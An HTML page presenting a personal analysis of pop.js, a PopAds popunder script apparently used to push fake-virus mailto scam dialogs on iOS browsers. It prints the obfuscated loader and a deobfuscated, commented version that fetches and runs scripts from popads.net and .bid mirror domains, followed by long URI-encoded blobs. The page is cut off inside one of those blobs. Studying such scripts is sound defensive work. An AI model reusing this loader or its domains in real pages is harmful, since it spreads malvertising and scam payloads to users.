@@ -1,0 +1,324 @@
+<html>
+
+<head>
+	<title>pop.js</title>
+
+	<style>
+	
+body {
+	background: rgba(0,0,0,0.1);
+}
+
+.pre {
+	padding: 16px;
+	background-color: #f0f2f4 !important;
+	border-radius: 3px;
+	margin-top: 0px;
+	margin-left: 2%;
+	margin-right: 2%;
+	margin-bottom: 16px;
+	box-sizing: border-box;
+	line-height: 1.45;
+	overflow: auto;
+	display:flex;
+	max-width:100%;
+}
+.inl-pre {
+	padding: 4px;
+	background-color: #f0f2f4 !important;
+	border-radius: 3px;
+	margin-top: 0px;
+	margin-bottom: 2px;
+	display: inline-block;
+	box-sizing: border-box;
+	line-height: 1.45;
+}
+
+code {
+	padding: 0;
+	margin: 0;
+	overflow: visible;
+	background-color: transparent;
+	border: 0;
+	font-family: "SFMono-Regular", "Consolas", "Liberation Mono", Menlo, Courier, monospace;
+	font-size: 14px;
+	line-height: inherit;
+	word-break: normal;
+	white-space: pre;
+	font-weight: 400;
+}
+
+	</style>
+</head>
+
+<body>
+	<p>
+		<a href="/">Return</a>
+	</p>
+	
+	<h2>pop.js Analysis</h2>
+
+	<img src="https://pbs.twimg.com/media/CxB8DC3WIAAJoFq.jpg:large" style="float:right;margin-left:2%;max-height:500px;max-width: 70%;" />
+	
+	<p>I use the browser Brave on my iPhone occassionally, and I found that some ads are able to bypass the Brave adblocker by creating a mailto dialog, which opens the native iOS Mail app. The dialog is preloaded with a subject line which states that your phone has a virus, and gives a number to contact.</p>
+	
+	<p>This technique is especially annoying, because whenever you switch back to Brave, it will again immediately redirect you to a new mail draft. I decided to try to find how they are doing this.</p>
+	
+	<p>Apparently, this was <a href="https://apple.stackexchange.com/questions/267132/ios-safari-repeatedly-opens-virus-detected-emails">fixed</a> in iOS 10.2, but it still affects Brave.</p>
+	
+	<p>I began by using Chromium in Remnux to use the responsive design feature, which changes the document size to that of the selected mobile device, and also sends the appropriate user agent of that mobile device. I believe this is not fully enough to eliminate device identification, because scripts can check the installed fonts, which may be different.</p>
+
+	<p>I needed to find a shady site which has ad scripts which use this mailto technique. 4archive[.]org fits the bill. Not always, but occassionally, it will redirect to a site which employs the mailto adblock workaround.</p>
+	
+	<p>4archive loads many scripts - the nineth in my network analysis is <span class="inl-pre"><code>pop.js</code></span>. It had already been scanned on VirusTotal <a href="https://www.virustotal.com/en/file/8880030c85d4168bca4e1241f8277380d0ce19d8f504f83b09a91dbdfbf9794d/analysis/">here</a> with one detection for a ransomware heuristic. The script is loaded by index.html at line 52.</p>
+	
+	<div class="pre"><code><span style="color:green;">&lt;!-- PopAds.net Popunder Code for 4archive.org | 2017-07-25,1006003,0,0 --&gt;</span>
+&lt;script type=&quot;text/javascript&quot; data-cfasync=&quot;false&quot;&gt;
+<span style="color:green;">/*&lt;![CDATA[/* */
+/* Privet darkv. Each domain is 2h fox dead */</span>
+(function(){ var u=window;u[&quot;\x5f\x70\x6fp&quot;]=[[&quot;\u0073\u0069\x74e\u0049\u0064&quot;,1006003],[&quot;\u006di\u006e\x42id&quot;,0],[&quot;\x70\x6f\x70un\x64e\x72s\u0050\u0065\u0072\x49\u0050&quot;,0],[&quot;\u0064\x65\x6c\x61\x79Be\x74w\u0065e\x6e&quot;,0],[&quot;de\x66\x61\x75\u006ct&quot;,false],[&quot;d\u0065f\u0061\x75ltP\u0065r\u0044a\x79&quot;,0],[&quot;t\u006fpm\x6f\u0073t\u004c\u0061\x79\x65r&quot;,!1]];var r=[&quot;\x2f/\x63\x31\x2ep\x6f\u0070\x61d\x73\u002ene\u0074\u002f\u0070o\u0070\x2e\u006a\u0073&quot;,&quot;\x2f/c2.\u0070o\u0070a\u0064\x73\x2e\u006e\u0065\u0074\x2f\x70\u006f\x70\u002e\x6a\x73&quot;,&quot;\x2f/www\x2e\x68mdm\u0076\u0061xm\u006d\u0077o\u0073\x6f\x2e\x62id\x2fr\x2e\u006as&quot;,&quot;\x2f/\x77\x77\u0077.\x70\x72\u006ay\x77\u0069\x78f.\u0062\x69\x64/\x72\u0064.j\u0073&quot;,&quot;&quot;],m=0,z,h=function(){if(&quot;&quot;==r[m])return;z=u[&quot;d\x6f\x63\x75\x6d\x65\u006e\u0074&quot;][&quot;\u0063\u0072e\u0061\x74eEl\u0065m\u0065n\x74&quot;](&quot;scr\x69\x70t&quot;);z[&quot;\u0074\u0079\x70\u0065&quot;]=&quot;\x74\u0065x\x74\u002f\u006a\u0061v\x61s\u0063\u0072ip\x74&quot;;z[&quot;a\x73\x79\u006e\x63&quot;]=!0;var f=u[&quot;\u0064\x6fc\u0075m\x65\u006e\u0074&quot;][&quot;ge\x74\u0045l\u0065\x6d\x65\x6e\u0074s\u0042y\x54a\u0067N\u0061\x6d\u0065&quot;](&quot;\x73\x63\x72\x69pt&quot;)[0];z[&quot;\u0073\x72\u0063&quot;]=r[m];if(m&lt;2){z[&quot;c\u0072\x6fss\u004frigi\u006e&quot;]=&quot;a\u006e\x6f\u006e\u0079\x6d\x6f\u0075s&quot;;};z[&quot;\u006f\x6e\x65r\u0072\x6f\u0072&quot;]=function(){m++;h()};f[&quot;\u0070\u0061r\u0065n\x74\x4e\x6f\u0064\u0065&quot;][&quot;\u0069\x6e\x73e\x72\x74B\u0065\x66\u006f\u0072\u0065&quot;](z,f)};h()})();
+<span style="color:green;">/*]]&gt;/* */</span>
+&lt;/script&gt;</code></div>
+
+	<p>That HTML comment is a bit suspicious, so I decided to DuckDuckGo search "Privet darkv". DuckDuckGo had no relevant results (most results are non-English), however Google gave up some interesting links. Apparently other people have been investigating this code as well, as the results are all for DDecoder decodings of the encoded characters.</p>
+	
+	<img src="privetdarkv.png" style="margin-left:2%;max-height: 500px;max-width: 70%">
+	
+	<p>After decoding, the script is readable, and I've prettified it from there, adding comments.</p>
+	
+	<div class="pre"><code>(function(){ 
+	var e = window;
+	e["_pop"] = [["siteId",69093],["minBid",0.0005],["popundersPerIP",4],["delayBetween",120],["default",false],["defaultPerDay",1],["topmostLayer",!1]];
+	var h = ["//c1.popads.net/pop.js","//c2.popads.net/pop.js","//www.utwhgyjgjw.bid/lp.js","//www.opdfugwvncf.bid/zcr.js",""],
+	r=0,
+	j,
+	b=function(){
+		<span style="color:green;">// Return if we've exhausted the list of js mirror sites</span>
+		if ("" == h[r]) return;
+		<span style="color:green;">// Create a script element</span>
+		j = window.document.createElement("script");
+		j.type = "text/javascript";
+		j.async = 1;
+		<span style="color:green;">// Get the first script on the page</span>
+		var z = window.document.getElementsByTagName("script")[0];
+		j.src = h[r];
+		<span style="color:green;">// For the first two js mirror urls, set crossOrigin to anonymous</span>
+		if (r < 2){
+			j.crossOrigin = "anonymous";
+		};
+		<span style="color:green;">// If loading the script fails, move on to the next mirror</span>
+		j.onerror = function(){
+			r++;
+			b()
+		};
+		<span style="color:green;">// When the script is loaded successfully, insert it before the first script on the page</span>
+		z.parentNode.insertBefore(j,z)
+	};
+	b()
+})();</code></div>
+	
+	<p>The main reason I chose this script to check out is that it contains two URI encoded strings, one of which is very long.</p>
+	
+	<div class="pre"><code><span style="color:green;">// Found in HhcD.A.Z</span>
+var d = '', G = decodeURIComponent("5D%3C72%20%22b-7%3E%3E%22O2k%04-%24X%3E1w%23%23B%3Ae5%2Bv%5D!%243%2B2%11%2C%201!%24Tn)%3E-3_%3D%20w(%3F%5D%2B%3B%2B%60g%03ykg%60f%1F%7F%3B%2B%60%23_*%201'8T*%3B%2B%60%26%5E%3E%243%3Dx_%2B1)2xA!5%22%202T%3C%2F%24%605%5E%23%7F)2xq%20%20%2399C%25%3B%2B%60vT65%3E%3C3B09y%60%3A%5E-%24%3B0*%1Fa%3B%2B%60%23B%2Be%24%3A%24X-1)2x%11**%3A%2F%3F_%3D%3B%2B%60g%08%7Ckfxn%1F%7Fknw(M%60)8-7%5D%26*%24%3A(M%60%16)2xs%2B1%23%2B%24%7B%3D%158%3E(M%60*5%243R%3A");
+<span style="color:green;">// Found in C5EEEE.C5.C</span>
+var z = '', a = decodeURIComponent(")8%2B%20%2C%3D4%2Bk%2B%2C%3A%05%20%2B%13%3F%26%3A277476y%22%269%00%3E2(%3D1g%25%06%01%04t%1C%18%3B%10*%0E%07--%0B%3B%22%18%0E%3A%13..%7D%189%26%2B%1Fz)%1Cu%24%1Db%25%06%01'x%23%13%3B%1Fq%03%3E%03%3D%089%00%0D%04%3C%1F%17%02y%1B%3D%1F%2B%0F%0D%07e%14)%03%22%18%3A%1C%3B*%1D%13d%1C%14%17%7B%3D%3D%15*%1B%24%10d%04)%000%07-%08s%1C%24%04b%14%07%03%24%0C%10%084%14%0D%04e%14%04%17%20%0C%13%0A%2B)%23%10%3B%1F%07%1D%2B%08%14%17%09t%20%09%19%1C%07%04%25%3A%0F%24%17t%20%09%192%07%1D%02z0%26%2F5%1E%2B%3F%0F%0B)%02z0'%24%0C%0D%07%20%04%07%00.%03%13%0As%08%0D%07%20%04%07%00%3E%0B%3D%06%0Dy%0E%03%20%04%07%00%3E%0B%13%0Cq*3%07%2F%04%07%00%3E%0B%13%084%22%18%0E%22%07%00%00%3E%0B%13%084%0C%1A%05-%08%17%00%3E%0B%13%084%0C%0D%07%1Cu%24%2F.%0B%13%084%0C%0D%070%10%17%020%0F%13%084%0C%0D%07%20%04)%0E%07~%10%0C4%0C%0D%07%20%04%07%04%7C%03%3D%08%3B%0C%0D%07%20%04%07%00%3E%25%06%01.%0F%1A%04-%10%17%03%7B%0B%14%084%0C%0D%07%20%04%07%00%3E%0B%13%08%08%7D.%040%04)%0E%07%13%00%1F%3A%25'%09%19*.%14%3F%18%3A'%2F%3D%18%0E%7Cq)%0E%07!.%0F4%0C3%00.%049%06x%03%13%0A%3B%14%0D%07g%0C9%03%3E%13%03%084%04%23%05%12-%00%04%25%18%0F%1C%06%1F%7B(%19%7C*%0E%07!%04'5%03%24%06-5..%25%18%3A'r%0Fz(%20-%00%040%1Ce%1Cr%1F%7B(.%07r%01%02z%06%0E-%0C%0D%079%26%07%00%3B%07%03%089%0C3%07.%08)%00z%0B%3D%0B%3B%0C%23%07a%14%06%06.%1F%10!%2B%1F%22(!)%04)!%1C%3A%26%07t%20%09%192%07%1D%02z0%24*t%0E%03%20%04%10%03%02z0%24*t%0E%10%22%13.%0E%07~%3D%15%08%7D%08.%20)..%23%04%01%1Cq%0B%24%19!%04%3A%18%3F%25%06%013%3E%1D%014!*%01%3C%1B%0F%24%2B)%01%03%3B%0B%1B%14%252%10%10-*%0A%12g%0F%1B%17%3A%0C%3A%094%0F%11%138%04%3A%18%02s%3E%06%0D%3A%0D%1A%1Cu%24%2C%20s%10%0C4%0C%0A%04%1Cu%24%2C%20s%10%1F6%1B%24%09%19q)%1D%02z%06%1D%24%04%0F%03%20%04%00%03.!%3E%1F%2C%0C0%1D0%08%1B%17%3D%0C%3A%115%22%18%0Eo2)%0E%07%25%3A%1C5%0F%0A%070%08)%0E%07%25%3A%1C5%1F%24(%3B5%12%09b~%3D%06%0D%04%0F%03%20%04%3A%00.%1B%1F%263%07z%13%03%03.)!%3Ag%09%08%7D%08%1Ao*%12%098%00e'%24%0C%0D%03.*%12%098%00e'(x%1E%10%1Cu%24%1Db%25%06%01%3B%0C%0A.%22%13p%2F%0Ds%3E%06%0D%7D%0F%03%04%07%00%00.-%13%0C!%0F0)%3C)q%1E%3F%25%06%019%1B%7B%10%3F%07r%01.%1F%10%26v%1Fx%06%1Cu%02%1Dq%25%06%012%07%7B(0%04%07%041%25%06%012%07%7B(%3Cp%14%17%02z%06'%2B%1B%24)g%0B%0B%17%3C%1C%3A%06%0D%04.%02%3E%7D%0E%0C%7C%01%160%10%23%3B%1Fa%06%1A%01%3A%1B%15%2F%0D%7C%04%18%15%24%25*%1D%09%05%0A%01%2F%0D%3D%19%3D%0E7%07z%12%3Fs7%18%3F%1B%0E%0D%0B%07%07%0Evs%23%3Bz%1B%16%12%08y)%06)%05z(%0C%15%1Dv%3A%2B%2B%01%14%0C%1D%13%0B%14(%10%259%2F'%01%11%0F.%7F%16%22%08%2C%20.%3A*.x%0E%13%3F%16%14%17%050%1D.(%20%24(%3B%07%11%15%0A%08%16%08%16%07%0D%7F%252%09(%02z%06'%2B%1B%24)g%0B-%0E%07~%3D%15%08%7D%08%04%20%00%07%04%26%18d%1F6%1B%0E%1E!*%12%09%25%18e')%1B%0E%18%3B%17%1B%14%3A%10g%09%24%04%11%10g%3D%14%2C%0Es%3E%06%0D%3A%0D%1A%1Cu%24%2C%20s%10%0C4%0C%0A%07%2F*%12%098%00e'(x%1E%10%1Cu%24%1Db%25%06%01%3B%0C%1A%13%3D%7C*%0E%07%1F%10!%2B%1Fz%1F%1F%17%0B(%0Fs%14%0C%2F%0F%11%2F%02%7C*%0E%07%1F%00!%3A%1F%01%03%15%0Br%01%02z%06%08%24%08y%1B!*%12%09%3A%0C%00'%3At%24%1E!%04%10%19%0As%3E%06%0D%3A%0D%1A%1Cu%24%2C%20s%10%0C4%0C%1A%05%1Cu%24%2C%20s%10%1F6%1B%24%09%19q)%1D%02z0%10%24%0C%0D%03%2F%04%00)%3C%1C%3A%26%2B%0Fx%06%1Cu%24%18.%0B%13%0C4%08%0D%03-%17-%2F%25%189'5%03y%06%1Cu%24%1Db%0B%3E%15h%0C%20%1F0%04%07%04%7C%0B%14%08%17)y%0602%07%1D.%1F%10!%2B%1Fz%1F%1F%17%0B(%0Fs%14%0C%7B%3A%0D%03-%13q%140%1Cd'9%1B%24%1F!*%12%09%3E%0B%04%1Fs%0B%0E.!%0Fr%01%02z%06%1D%24%04%1D%05d%04*%001%13%13%0C4%0C%0A%0706%05%04%7Ds%3A%14%2B!%0E%10%3Bts%01%02z%06%1D%24%04%1D%05d%04*%001%13%13%0C4%0C%0A%0706%05%04%7Ds%3A%144t%24)%13%7C*%0E%07%1Fe%1F%2B%0Fx%060%10%04.%7C%18f%09%08%7D%08%1Ao*%12%098%00e'%24%0C%0D%03c*%12%098%00e'(x%1E%10%1Cu%12%2F!%1C%3A%26s%03%01%10%22%13.%0E%07%25%20t%00%26%3C%1E%16%04%02%00%01%0F-%11%1A'!%0B%0E.%2B%24%139'%00%0B%0C%08x%1Au55%0A%0B%20%1F2%09%0E%13%3A%07%04%14.%04%10%2Bw%3D%18%0E%23%03%14%170%18d%26%08%7D.%1A%7C*%12%09%7C%07%13%0C%2C%1Fz%10%22%13%04%19%3F%25%06%01%2F%1F%7B(%3D%13%04%1F%25%18%0F%1C0%17y%060%0C%1B%17y2%00%24%04t%20%09%19%1C9%00.%07f%09%08%7D%08%1Ao*%12%098%00e'%24%0C%0D%03%2F%00)%0E%07%25%3A%1C5%1F%24(%3B5%12%09b~%3D%06%0D%04%0F%03%20%04*%00.%07%0F%1F7%0B%24%1E!*%12%09%1A%08%14%08%24%08%0D%03-%13q%17!%08f%09%08%7D%3E%10!%3D%14%14y%0Ce%145%0C%1A%10%20)%0B%1B%3F%25%06%01%7B%3A%23%09%19*.%14%3F%08%14%08%24.%23%09%19%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%08%7D.%18%07%13%16%07%25%25%06%014%22%18%0E%3A%13..%7D%189%26%2B%1Fz)%1Cu%24%1Db%25%06%01'x%23%13%3B%1Fq%03%3E%03%3D%089%00%0D%04%3C%1F%17%02y%1B%3D%1F%2B%0F%0D%07e%14)%03%22%18%3A%1C%3B*%1D%13d%1C%14%17%7B%3D%3D%15*%1B%24%10d%04)%000%07-%08s%1C%24%04b%14%07%03%24%0C%10%084%14%0D%04e%14%04%17%20%0C%13%0A%2B)%23%10%3B%1F%07%1D%2B%08%14%17%09t%20%09%19%0C%05%04%3E%0B.%0B%24%1Cz(!%0Fr%01%02z0%10%24%0C%0D%03f%04%3A%2F%24%7F%00%165%22%18%0E%20%00)%031%0B%3E!%2F%07%01%1F!*%12%090%0F%13%0C%2F%3D%11%2B%03%7C*%0E%07%3D%13%15%08%7D.)%3B%3D%14%2C!%00%1F!%08%7D.(0%04%07%00%3E%0B%13%08%24%18%1D%04e%04%07%00%3E%0B%13%084%0C%23%09%19q%04%04%3E%0B%13%084%0C%0D%03-%14%07%001%0B%13%084%0C%0D%07%20*%12%09%3C%08%14%084%0C%0D%07%20%04%3A%00%7B!%13%084%0C%0D%07%20%04%07%00%02z0'%24%0C%0D%07%20%04%07%00.%03%13%0Ap%0C%0D%07%20%04%07%00%3E%0B%3D%06%0Dy%0E%03%20%04%07%00%3E%0B%13%0Cq*%1D%04%20%04%07%00%3E%0B%13%084%22%18%0E%22%07%00%00%3E%0B%13%084%0C0%04%2F%04%07%00%3E%0B%13%084%0C%0D%07%1Cu%24%03.%13%3D%06%0D%14%1E%10.--%0E%07%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%14%0C%24%0C%0A%030%04%00%04.%0B%3E%06%0D%22%24%13!%17.%2F%25%3A%06%01hy%23%09%19%04)%00%7B%0F%13%0C%16t%20%09%19%00%07%04%06s%3E%06%0D%26%23%07.%00%07%04%0Fs%3E%06%0D*%0D%03%07%7C*%0E%07z%11%0Cp%04%1D%070%10%17%03%7B%0B.%12%24*y%06%1Cu%24%03%7B-%03%08%24%3Ay%06%1Cu%12%00.%1B%00%1Fu!%24)%3F%13.%2F92g%09%08%7D%08%1Ao*%12%098%00e'%24%0C%0D%03e*%12%09%1Deoq*%15%20%09%19%1C)%011z%3E%17%06%0F%1F%00)9m%18%3D%23%3B6m.%3B%2F61%26%08%25%2F%3A%20-976y%2B%26%3A%1D%2B5%3B%3Fc-%2B%23%24y9%2C2%23j%2B9%24%26%7By0.%3B%23'1%7D%3A%20%243*4c*%2686%26e%60q)9m%3E%2C%3E%1E1%26%2076y%2B%265%3D%19%3E'%2F%24'-)9m%3A%20%243*4c%3D%25'k%20!%2692mjv76y%3Fn%24'.2%3Dy35d%021*!%3Ad%25%24-)76y%26%2F%24%2C%24%23%1D%3D1g%239!%265%06%2C)9m)%2C%3C%3E%26%2635d4*%2C%26%20%2F)9m%22%2B%202%26735d0%207%08%25%2F%3A%20-9%3A%08.%11%22*%07%2B%3A%20%3D1g%3E26735dk%3B%3Fc'%2B!%2C%24%2C%3D%25%25k1(8%3F267%00%00%0E%1E%04%20.%2C9%24m8m%3A3%24%20%3Bwi%3E%250%26m4cl%3B%3Fc-%23%245%2F%2C0p9*-(76y1%2C%1E%3D8%3E%2B%2435d9*-(76y7'35d5%20%25%22%3B%2F%185%26%2376y2*%23-%25%20k0(%25%2Cy%26%2F%22%3A%2F%7Flx35dle%2659%23%25%200p76y%23%2C%3F*%2F%02%2B'(%3B4%2Bk-%2C%24%2F)9m.%25%2B%246%3D1g%118')(*%3Ew%041%3F(3%0A%3B%3Fc*%26%3E%26(35d%07%201%20%209%24%2C%2C%2376y!%26!(3)9m%0E%26%25%3C%2C%26c%3B%2F%3A*5(76y'%2C%22%25%2F6%2B%3D1g%3A6%22%26%1576y%26%2B%2C'-2!%17%22%3C)%3F%20035d%23%24%24%03('2%3B%3Fc'%2B!%2C%24%2C%3D%25%25%3B%3Fc-%2F50%2435d47%26%2C%3D%2F%12)%26%20%2C%24%23%3B%3Fc%3E%239!%2C%3A76y%236%23*%3E%3E*-35d%25%2028%2C9%23%3B%3Fc9%25'%3B%3Fc%3C%243%20%25%24'%2F3%3B%3Fc(%3A')%3A35d8%23%25%3E%2C%3E%1F%20**!%3E)9m%3B(8w5%2C%3D%1E%239e~m%3E%239!%2C%3Ag%25'%20-e%3C8%3Bic%23('2ic%229%3E%24lx35d'*3%0B(%26%3B'%22.%22%05'1*%22'9)9m%1E%3D%25%25%24%24(g921%3D1g%239%2B%26%3F%1E%2331%2B35d%226%26%3F%08-2%2B735d2)%26%20%2C%24%23%031%22%24%1A8%2C-976y1%22%2F%3C%3A)9m%1E%3D%25%25%24%24(g-21%3D1g)%3B%20%22%3F%1D%23%3A%20%2C8%3D4%2Bk%7D35dt%3B%3Fc%7Bzfrlyf%7Bf%3B%3Fc%0B8820(%3Bd%3E6%02%23-88%2C'35d%3F17%3D%3Ap)9m%3E!%2311%3D1g'%3E%2B%3D1gw%0C%1Bx%10b4%2Bk)%22%20%24)9m%3A%20%243*4c%2Bb~~%3D1g%2F!%20-9%3A4%2Bk%169%20%26%24k7%24%24%2F)9m9%26%3F4-09(8%23%3B%3Fc%0C%3C2%2B7c%3C%245%2C-)76yx~p76y%2F%22%3B(947*%3D%3D4%2Bk'(%3F4%2Bk*%23%20%3E%18%2B%2F%22(.)9m)%2C%3E6%26%2B%08%3F%2F91%3D1g947*%3D%3D4%2Bk%20!%2692%3B%3Fce4%2Bk%22%2F*.2%23%24%25%20%20%3C).%23%26%3A%26709%3C%3C%20%3D%3A776y)%2C.(%3E%3E*-35d0%207%0C%3D%3E%25%2C!8%3D%2F)9m%1F%2C%262%240(s4%2Bk%20%22'%3E2%2B7%09%26)%22(%26%23%3D4%2Bk4%24'.82m%20%22%3Awxc%2B%3C%2441*%22'b%227%2Fai%246(%26ai%25'10di1)9m0i)61%20%25ib2lc644%2Bk0(%3D%0391%26%3F%3F%2B%3B%3B%3Fc%3D8.e835d5%2C-)76y8x35d653('.%14-*!-4%2Bk%2C8%3D%2F%25%12*)%3D%22)9m%3A%20%243*4c%2Bw10-.%3D%238%2Bkd2%3D%3E%2B'%22%3Ed%25%200%243%2F%03*k%7Cez~~4%24'.82m%20%26%3C2%11%2Cep%2Fbiz(%7Ccl8x35d%3B*%20%2C%25%19%23*1%2C.%2F)9m%24'%3A%221%3D1g%7F%60ksc%7Bsorm%7Czy)9m%3E%2C%3E%1617%3F%20(%221%2635d%23*%16%3D9%2F%25%06%22%3E%2C4%2Bk%01%3F%26%3D%24%201c%209%185%26%3F(4%2Bk%06%3B%2C%24%23k!%24'.)9mq%3A)%25%2C39w921%17%24%24%2F807e%2F%3F9%267%24%26%24%7Fl8%3A%20%243*4c%25%254%247%24%26%24y-1(%2Fwu%3B%3Fc%26%3A2%2B%26%3F76y%2B%2C)%2C%046(%2635d%22%2B'(%3B4%2Bk%01%3F%26%3D%24%201c%3F%2F%256*%22'%098(3%2C%3B%2F)9m%3A%3B%23%23%20%3D1g%3E6'6%23-%2F%25%3B%3Fc-%2B%23%24y35d'7%2C9%26%3E.5%2635d%3A*6%3E%2C.82-35d%1B*%24*%2C8y51%24'%3E)9m.%25%2B%246%3D1g%06667%1D%26%3A%161%3D1g%05!%201!(3)9m%2476y%15%2B%2C'j%03-%22%23!j%14*-*iv'1%20%22'-nu%03*%24%2B%3E)m.%26'i%3B%3Fc%1F%2F%256*%22'p)9m%2B%26)%226%3D1g)8*(%24%2C%1A61%2B35d'00%2576y-1(%2F4%2Bk*%23'%2F%25%0D%17%00%054%2Bk%20%22'%3E2%2B7%1A%20%243*435d%25%20.%22%3F%2F%123%26%23%3D%06%3E67('%2F%25%3B%3Fc%3A%3E.)%2635d%3A*!%24%25%2F)9m%3B%209%3E'*!%20%3E.%7F%2B%24-.2%2Bx%3A%20.%23-y%7D92l-%26%24.%22%23%7Fs%3D1q'*0%24%3D%238%2By%2C%2B98)69%2Cq%23*3wxzg%60x!%2C%2C%23%7Fsv9%25%3E%2B7(%3Bg23%26%23%3D9m%2B%2C%23%2Cq83%26%3F%2F%2682y%25%20.3%20-v76y%071%22%3E927m%24%3A%078%3F*!%25%2B)9m9((%22%2B'(%3B%1F%25)%3D1g%03%19%15%16%1976yy~35d%157%2C%3A%3A%2F%25k5(%3B9%3E*-35d%07*38'.27c%1E*8%3E57m%09j'*38'.27)%3Eg)8(%3D1g%2487%26%2B76ym%1F%3E5n~%3B%3Fc%1C%3E%3E)0c%3F%2F%256*%22'%098(3%2C%3B%2F)9m9%26%0F%3B%20.('%3E)9mb76y%0B%2C9%20%2C%3E%26%229%20%259%3B%3Fc-%23!%3B%3Fc%0A%258.*(g921%3D1g%3A273%2C.%2F)9m%00%26%3F%24%20%06%3B%2C%24%236%3D1g%05%15%0F%06%0E%1D4%2Bk0%3F*4%2Bk0.%3B%2F2%2B%1B35d1)%2C%22%3B4%2Bkxm9%2B%23-~35d%25%203!()2%3B%3Fc%1A%3E87%22*%2Cd%25%20.%22%3F%2F)9m9%3B3w%3Ec%3D%26%3A%00%2C-c%26%3A2%2B%26%3Fiww%2B6!%25qw8c.(%3E4-ce%2Ccw%3E%3E35d4%24-.%2C%26%150!%2F%25%2F)9m%1E%3D%25%25%24%24(g%23%24%045%2C%20%266'%2F(76y%2479()%3F%005('%3E)9m90%3A2%3B%3Fc*%262%241%04'%3E275%2C%254%2Bk-%22d82%23%26%3F%3B%2F%25%3B%3Fc92l%3B%3Fc%1C%3E%3E)0c%209%11)%22%3E!%0F9%24!!%2C.)9m%2C%2B%25%221y%2F%25%2B9.%3D1g%1F%23%2C%2F%3Eg-21%13%2C%3B%2F91%3D1g%3E67%24(%3D4%2Bk**'%25%25%20%0F%24%3A%3E2%2B%26%3F76yy0.%3B%23'1%7D35d3%2C0%3D%25%2B.%3B%3Fc9823%26%23%3D%0E2%23%228%25%3E)9mp76y%3B%3Fc%0B8820(%3Bd%3E6%05%24%3B%2F1*%3B35dz-%22%23-%262!%3D1g%2286735dkj0.%3B%23'1%7D35d%157%2C%3A%3A%2F%25k*%3E%1E%2F5.*976y%1A!!(%24%3C%3B%3Fc%3D%25%22%26%2B('.)9m%3D%26%3A%22%2B'(%3B4%2Bk%169%20%26%24k.(%3B-2%3B%3Fc%3A%2F%3B%20%209%268)9m9%26%1F%03%06%109%3B%239%22%3D1g%08%25*4%3E%2C8y%2C0%00%26(%3E)%2635d%3A*!%24%25%2F%04%20-%3E%20%3E%3E3%2635d%240!%3E%3D8)9m.%3B%2F61%26%08%3F%2F91%3D1g%3E85y35d%25%20.%22%3F%2F%1E1%26%2076y%26%2C%3B%2C8%03%24%24%3E76y%071%22%3E927m%24%3A%1D%3E%2B%3D1gxypm%7Fy4%2Bk1(%3D%3F%25%2Bc%3D%26%3A%00%2C-v76y5%22%3F%2C%24%23%0B%2C)%2C4%2Bk%2C%23%2B%26%227%3D1g%230%2B%2C%3F%2C4%2Bk.%22%3C920335d%157%2C%3A%3A%2F%25k*%3E%0C.0%20%3D1g(%3B*%20%2676y61.%0C%262(%26%23%3D4%2Bk09%26%3A%077%2C%3D(-61*%22'4%2Bkk%135%16%24l%3D1g%0B)9m%3D%26%3A%225%3D1g921%17%24%24%2F80735d4*5(%3B%1947%2C!%25(67%3D1g(%3B0135d%157%2C%3A%3A%2F%25k*%3E%0A%22%25*.(76y*-35d%3B*%2435d-%0C-)%2C2)9m%0F%3B%25%206%26%3Fg%23%24%0C%0C%1E76y%243%3D%25%234%247%24%26%24x5'%2B76y'%22.%22-%25*6%23-p%237%22%23%3A%3A67%26%23%3Dq'*0%24%3D%238%2By%2C%2B98)69%2Cq401%3E%268m5%2C%24'%3E27x35d%24-%2C8%25.%11%2C1(76y1*%20%2C%19%23%24.%3D76y%24%259%2C8%185%26%2376y1%2C%01%26%3D27%00%2C%3A%2F)9m!%26%2B3%3B%3Fc%3A)%25%20%26%2376y7%26%3E%2002%11%2C35d0%207%08%25%2F%3A%20-9%0B3%1E!%3D1g%222%2C%24%25%3Dp)9m!%2C%2C%23%3B%3Fc%3B%2F%3A*5(%0A%22%3E)'35d5%2C-)%1D%25)9m%3A%20%243*4c9%2B%25%20-9iww2*%23-%25%20k7%229jje4%24'.82m%2B%3B%2B%3A%20%06!%2C'2%2B7mtj90%2F!r4%2Bk'%22*%3F%3A%20-976y6%2F%24*%2F)9me%2F%3F9%267%24%26%24wmjm27~~%3D1g'%3E(%26%190%3A26%3D1g%2396%26%3F%3D%082%23%2C%3F%2C4%2Bk%03%23%2C%3E%20*1%2676y%107%24%259y0%17%24%24%2F80735d%1607%25%268m%3B%3Fc%20-9*1(%1D%25)9m%0F%1C%1E%03%0A%0D35d3%2C0%3D(%3E4-%06%3B%2C%24%23%3B%3Fc*%2596%2C!%2C4%2Bk%22)-%0F!%20-9%05%23%241%26%23%2C8)9m%0F%3B%25%206%26%3Fg%23%24%08%22.76y6%269%1D%23%3A%20%3D1g)6)%2F35d%1B*%24*%2C8y)%2C*76y*3('4%2Bkm35d%20%2C'9!4%2Bk3%2C.%2F%0E%3B%3Fc%26%2C16%269%05%2F11%3D1g%233%3B%3Fc%24%2B%23%26%2B35d2%3D%26.76yz%3D1gl)9m%0F%2C%3E%23%201%07%3A%1A85%3D1g%3D%3E!7%25s4%2Bk*%23%20%3E%1A*6%3E%2C%0F!%20-976y-%26%24.%22%23%3B%3Fc'%25%05%20%25(%3B%2F%25%3B%3Fc%24%2B%2F%3B%3Fc%3E%239!%2C%3Ag%2B%3B%2019ah%07)%26%2C%3A%2Fw%26%2F%24*!w%0A%08m%3D%25w%26%2C%23%3D%2390%26ckclyl%3E*8%3E57s76y'%26%2B%26820-!%26%2B3%3B%3Fc-%2B%23%24%3D1g8216%3F'%1C6)6(76y7%22%23-%25%3A%3B%3Fc%3D%2F%2F1l'(%3C66%20%3F%20%3A%23%3B%3Fc%0A%258.*(g-21%3D1g%0